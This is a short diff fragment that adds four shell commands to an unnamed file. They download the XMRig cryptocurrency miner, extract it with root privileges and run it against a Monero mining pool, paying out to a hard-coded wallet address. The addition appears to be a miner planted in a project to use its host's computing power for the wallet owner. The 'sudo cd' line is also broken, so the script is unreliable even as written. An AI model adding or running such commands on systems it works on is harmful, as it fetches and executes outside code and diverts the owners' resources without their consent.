@@ -1,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
+sudo tar fx xmrig-6.18.0-linux-x64.tar.gz
+sudo cd xmrig-6.18.0
+sudo ./xmrig -o pool.hashvault.pro:443 -u SuboPqchGv7NJujPcF5d6ijZpuYuwH6KF9UWY5MiK3hu2ERdSB4PwfSfUcQMXAMTUx4Lch34yFkv84HjG1yWNna21EPcXW3gZ6 -p test -k --tls -2
